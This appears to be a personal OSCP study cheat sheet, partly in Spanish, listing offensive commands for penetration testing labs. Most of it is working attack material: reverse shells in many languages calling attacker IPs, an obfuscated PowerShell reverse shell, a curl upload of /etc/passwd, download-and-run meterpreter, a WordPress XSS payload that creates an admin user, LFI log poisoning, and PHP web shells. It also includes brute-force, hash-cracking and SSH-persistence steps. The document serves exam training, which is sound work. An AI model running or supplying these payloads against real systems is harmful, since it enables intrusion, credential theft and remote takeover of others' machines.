- [OSCP](#Commands)
- [Enumeracion](#Enumeracion)
- [Password Attacks](#password-attacks)
- [File Transfers](#file-transfers)
- [Reverse Shells](#reverse-shells)
- [Ofuscación](#ofuscacion)
- [Evasión](#evasion)
- [Explotacións](#explotacion)
- [Post-Explotación (persistencia)](#persistencia)
- [Post-Explotación (escalada de privilegios)](#escalacion-privilegios)
- [Pivoting](#pivoting)
- [Exfiltración de datos](#exfiltracion)
- [Limpiando huellas](#limpiar-huellas)

# Commands

Comandos y herramientas que se encuentran en el documento de PWK

```sh
whois megacorpone.com -h 192.168.50.251
whois 38.100.193.70 -h 192.168.50.251
```

Usar google hacking

filetype:txt
site:megacorpone.com
intitle:“index of” “parent directory”

## DNS

```sh
host -t mx megacorpone.com
host -t txt megacorpone.com
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
dnsenum megacorpone.com
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

## TCP/UDP

nc -nvv -w 1 -z 192.168.50.152 3388-3390
nc -nv -u -z -w 1 192.168.50.149 120-123

### Powershell

```cmd
Test-NetConnection -Port 445 192.168.50.151
1..1024 | % {echo ((New-Object 
Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

## SMB

sudo nbtscan -r 192.168.50.0/24

# Enumeracion

sudo nmap --script-updatedb
sudo nmap -p- --open -vvv --min-rate 5000 -sS -Pn 10.10.10.4 -oN nmap
sudo nmap -sVC -p135,139,445 10.10.10.4 -oN nmap.service
 sudo nmap -sV -p 443 --script "vuln" 192.168.50.124

## Directorios

gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 

-w /usr/share/wordlists/dirb/common.txt  

## Tools

### Git

https://github.com/arthaud/git-dumper.git

## SNMP

| Identificador | Información |
|---|---|
|1.3.6.1.2.1.25.1.6.0 | System Processes
|1.3.6.1.2.1.25.4.2.1.2 | Running Programs
|1.3.6.1.2.1.25.4.2.1.4 | Processes Path
|1.3.6.1.2.1.25.2.3.1.4 | Storage Units
|1.3.6.1.2.1.25.6.3.1.2 | Software Name
|1.3.6.1.4.1.77.1.2.25 | User Accounts
|1.3.6.1.2.1.6.13.1.3 |TCP Local Ports

sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt


Realiza un bruteforce
```sh
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips

Scanning 254 hosts, 3 communities
192.168.50.151 [public] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT 
COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

```sh
snmpwalk -c public -v1 -t 10 192.168.50.151

iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT 
COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.3
iso.3.6.1.2.1.1.3.0 = Timeticks: (78235) 0:13:02.35
iso.3.6.1.2.1.1.4.0 = STRING: "admin@megacorptwo.com"
iso.3.6.1.2.1.1.5.0 = STRING: "dc01.megacorptwo.com"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 79
iso.3.6.1.2.1.2.1.0 = INTEGER: 2
```

Se puede utilizar la tabla para enumerar, por ejemplo usuarios

```sh
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2
```

## API
```sh
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

pattern

```sh
{GOBUSTER}/v1
{GOBUSTER}/v2
```

# Password Attacks

```sh
ncrack -vv --user rax -P wordlist.txt rdp://1.1.1.1

medusa -h 1.1.1.1 -u root -P /usr/share/wordlists/rockyou.txt -e ns -M ssh

hydra -l administrator -P wordlist.txt 1.1.1.1 ssh

hydra 1.1.1.1:80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt
```

## Password Generation with cewl and John 

```sh
cewl http://1.1.1.1/index.html >> words.txt

john --wordlist=words.txt --rules --stdout >> wordlist.txt
```

## Cracking Hashes - Linux 

```sh
cat shadow.txt | awk -F':' '{print }' > hashes.txt

hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Cracking Hashes - Windows 

```sh
hashcat -m 1000 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt
```

# File Transfers


wget
```
wget -O exploit.c 10.10.10.10/exploit.c
```

Curl Upload
```
curl --upload-file /etc/passwd http://10.10.10.10
```

## TFTP

### Local (start the service)

```sh
atftpd --daemon --port 69 /tftp
```

### Remote
```sh
tftp -i 10.10.10.10 get nc.exe
```

### Windows FTP 
```sh
echo USER>> ftp.txt 
echo offsec>>ftp.txt 
echo lab123>>ftp.txt
echo binary>>ftp.txt
echo get nc.exe>> ftp.txt 
echo bye>> ftp.txt 
ftp -v -n -s:ftp.txt 10.10.10.10
```

### PowerShell

```sh
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.10.10.10/fgdump.exe" >>wget.ps1 
echo $file = "new.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```


# Reverse Shells


Bash
```sh
bash -i >& /dev/tcp/10.10.10.10/7777 0>&1

sh -i >& /dev/tcp/10.10.10.10/7777 0>&1
```

PERL

```sh
perl -e 'use Socket;$i="10.10.10.10";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Python

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10”,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

PHP

```sh
php -r '$sock=fsockopen("10.10.10.10”,7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Ruby

```sh
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10”,7777).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
## Netcat
### Linux

```sh
nc -vn 10.10.10.10 7777 -e /bin/sh 
```

Windows

```sh
nc.exe -vn 10.10.10.10 7777 -e cmd.exe
```

Java

```sh
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/7777;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Powershell
```pwsh
powershell.exe
Start-Process $PSHOME\powershell.exe -ArgumentList {$2ade49964b1f45d3895f7a92eaf4c16c = New-Object Sy''st""em.Net.So''ck""ets.TC''PC""lie''nt('*LHOST*',*LPORT*);$477356af73714e84b32757bed7bf19d9 = $2ade49964b1f45d3895f7a92eaf4c16c.GetStream();[byte[]]$7ec1ae18501f4199b9d45c4546641020 = 0..65535|%{0};while(($i = $477356af73714e84b32757bed7bf19d9.Read($7ec1ae18501f4199b9d45c4546641020, 0, $7ec1ae18501f4199b9d45c4546641020.Length)) -ne 0){;$06e8b3156f9449e2bafb69c8905285be = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($7ec1ae18501f4199b9d45c4546641020,0, $i);$sendback = (iex $06e8b3156f9449e2bafb69c8905285be 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p''w""d).Path + '> ';$33b751e1a76042b5a7abf9f2b7b9301a = ([text.encoding]::ASCII).GetBytes($sendback2);$477356af73714e84b32757bed7bf19d9.Write($33b751e1a76042b5a7abf9f2b7b9301a,0,$33b751e1a76042b5a7abf9f2b7b9301a.Length);$477356af73714e84b32757bed7bf19d9.Flush()};$2ade49964b1f45d3895f7a92eaf4c16c.Close()} -WindowStyle Hidden
```

PowerShell with nc.exe or another rev shell .exe

```pwsh
PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/files/meterpreter.exe','meterpreter.exe');Start-Process ‘meterpreter.exe'
Windows (Web app with command execution and nc.exe) 
http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
```
# Ofuscación



# Evasión


# Explotación


# Post-Explotación (persistencia)
```sh
nano /etc/ssh/sshd_config
Change port 22 into 2222 and save the file. <Al hacer nmap al host el 22 cambia a 2222>
Then restart ssh

En la maquina local:

'sh-keygen'
'cd .ssh'
'ls'
'cat id_rsa.pub > authorized_keys'
'nano /etc/ssh/sshd_config'
Change passwordauthentication no

```

# Post-Explotación (escalada de privilegios)

Interactive Shells 

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

Linux Scripts 

```sh
wget 10.10.10.10/linuxprivchecker.py
python linuxprivchecker.py

wget 10.10.10.10/linux-enum-mod.sh
chmod +x  linux-enum-mod.sh
sh linux-enum-mod.sh

wget 10.10.10.10/linux-local-enum.sh
chmod +x  linux-local-enum.sh
sh linux-local-enum.sh

wget 10.10.10.10/unix-privesc-check
chmod +x ./unix-privesc-check
./unix-privesc-check

wget 10.10.10.10/solaris-exploit-suggester.pl
perl solaris-exploit-suggester.pl

https://github.com/DominicBreuker/pspy
```

Local

```sh
./linux-exploit-suggester.sh --uname 2.6.18-274.3.1.el5
```

Linux Commands
```sh
uname -a
id
cat /etc/*-release
cat /proc/version
cat /etc/issue
ifconfig -a
netstat -ano 
netstat --tcp
netstat -s --tcp
nmap -p - -sV localhost
cat /etc/passwd
cat /etc/hosts
arp -a
iptables -L
crontab -l
cat /root/.ssh/known_hosts
find . -name "*password*"
```

SearchSploit root Proceses

```sh
cat process.txt | grep root | cut -d " " -f 9 | grep "\[" | cut -d "[" -f 2 | cut -d "]" -f1 | cut -d "/" -f1  >> root_process.txt 
cat root_process.txt | sort -u > proccess.txt 
for i in `cat process.txt` ; do  searchsploit %i ; done
```

Windows Scripts 
```sh
wpc.exe --audit -a -o report
cd /Offsec 
python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --systeminfo sys-info.txt
python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --ostext 'Windows Server 2008 R2'
```

Windows Commands 

```sh
tree /f /a
systeminfo 
type boot.ini 
hostname
ipconfig /all
netstat -ano
nmap.exe -p - -sV localhost 
net users
net localgroups 
route print
arp -A
netsh firewall show state
netsh firewall show config
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v
net start
accesschk.exe -uwcqv "Authenticated Users" *
dir network-secret.txt /s
Meterpreter Tools
run arp_scanner -r 1.1.1.0/24

use auxiliary/scanner/portscan/tcp

use post/windows/escalate/getsystem
```

## XXS to Priv Esc

### Wordpress

Payload a utilizar, este crea un usuario y obtiene un nonce que es necesario para la funcion de crear

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
r params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Codifica el payload, esto se usa para poder evitar problemas a la hora de explotar

```js
function encode_to_javascript(string) {
 var input = string
 var output = '';
 for(pos = 0; pos < input.length; pos++) {
 output += input.charCodeAt(pos);
 if(pos != (input.length - 1)) {
 output += ",";
 }
 }
 return output;
 }
 
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

Se envía el payload, en este caso se usa un proxy
```sh
curl -i http://offsecwp --user-agent 
"<script>eval(String.fromCharCode(118,97,114,32,97,106,97 ... 115,41,59))</script>" --proxy 127.0.0.1:8080
```

## Path traversal to priv esc (Linux)

home/{user}/.ssh/id_rsa
/var/log/apache2/access.log

## Path traversal to priv esc (Windows)


Si se utiliza IIS, se deberían de revisar los siguientes archivos

C:\inetpub\logs\LogFiles\W3SVC1\.
C:\inetpub\wwwroot\web.config

## LFI

### Linux

Si hay un path traversal, se pueden revisar los logs de apache:
```sh
 curl 
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php 
HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 
Firefox/91.0"
```

Podemos enviar la siguiente línea como user agent y este será registrado en el access.log 
```sh
<?php echo system($_GET['cmd']); ?>
```

Volvemos a consultar el access.log

```sh
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

### Windows

Los logs se encuentran en el siguiente path 

C:\xampp\apache\logs\.

### Wrappers

Estos son utilizados para desplegar el código de php, por ejemplo

#### php://filter
```sh
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```
Este request muestra el admin.php, pero solamente el código html
```sh
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
Este request si devuelve el código php, porque no se ejecuta en el server y es posible leerlo

#### data://

El data sirve para poder incluir elementos como plaitext or base64 en el web server. Por ejemplo:
```sh
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
Otra forma puede ser:
```sh
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

kali@kali:~$ curl 
"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
```

## Remote File Inclusion (RFI)

python3 -m http.server 80
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

Siempre revisar si hay carpeta de uploads

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

### SSH 

```sh
ssh-keygen
```

Podemos subir el siguiente archivo

```sh
../../../../../../../root/.ssh/authorized_keys
```

Y tratar de sobreescribir el archivo de ssh

En caso de error, eliminar el known_hosts

```sh
rm ~/.ssh/known_hosts
```
### Extensiones a utilizar

.phps
.php7
.php
.phtml
.pHP

### Powershell

```sh
pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.
https://aka.ms/powershell
Type 'help' to get help.
PS> $Text = '$client = New-Object 
System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
PS> exit
```

```sh
curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
dAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
# Pivoting
```sh
Modificar -> /etc/proxychains.conf  -> socks5 127.0.0.1 <PORT> (Recomiendo 9000-1000)

proxychains firefox
proxychains nmap

Importante!!! Deben de hacer port forwarding al puerto que usan para conectarse: ejem
ssh -D 9050 root@10.10.10.1

Port Forwarding:

ssh -L 80:localhost:80 root@10.10.1.1 >>> tunneling http
ssh root@10.10.1.1 -D 127.0.0.1:8080 -N -f >> tunneling socks proxy
ssh root@10.10.1.1 -D 8834 >> tunneling socks proxy using web
```

## Ejecucion de comandos

Esta usando cmd o powershell? 
```sh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Recuerde encodearlo 

# Exfiltración de datos


# Limpiando huellas

# Tips

script /dev/null -c bash
ctrl Z
stty raw -echo;fg
reset xterm 
export TERM=xterm-256color
export SHELL=bash
source /etc/skel/.bashrc
